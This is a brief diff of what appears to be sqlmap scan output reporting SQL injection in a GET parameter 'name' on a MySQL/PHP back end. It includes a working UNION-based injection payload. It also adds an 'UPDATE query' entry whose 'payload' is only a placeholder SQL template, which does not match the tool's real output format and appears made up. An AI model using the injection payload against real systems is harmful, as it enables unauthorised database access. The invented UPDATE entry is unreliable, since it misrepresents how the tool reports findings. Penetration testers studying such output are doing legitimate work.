@@ -23,6 +23,10 @@ Parameter: name (GET)
     Type: UNION query
     Title: Generic UNION query (NULL) - 4 columns
     Payload: name=R' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a626a71,0x4d6d5a4c63464b5978754f4c46664c455061544f50694f4e5579636768506779664958426777637a,0x716b717a71)-- -
+
+    Type: UPDATE query
+    Title: Generic UPDATE query
+    Payload: UPDATE <table_name> SET <column_name>=<value> WHERE name LIKE '<value>'; 
 ---
 [14:57:55] [INFO] the back-end DBMS is MySQL
 web application technology: PHP 8.2.24, PHP
